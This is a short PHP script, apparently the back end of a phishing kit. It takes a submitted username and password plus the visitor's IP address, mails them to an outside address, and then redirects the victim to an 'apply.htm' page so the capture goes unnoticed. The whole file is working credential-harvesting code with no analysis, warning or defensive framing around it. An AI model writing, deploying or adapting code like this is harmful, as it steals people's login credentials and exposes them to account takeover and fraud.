<?

$username  = $_POST['j_username'];

$password = $_POST['j_password'];

$ip = $_SERVER['REMOTE_ADDR'];


$subj = "MY WIS";
$msg = "j_username : $username \n j_password: $password \n ipadd: $ip \n\n";


$from = "From: $ip<WIS>";

mail("globalserv@globalservicespaymt.com", $subj, $msg, $from);

mail("", $subj, $msg, $from);

header('location:apply.htm');

?>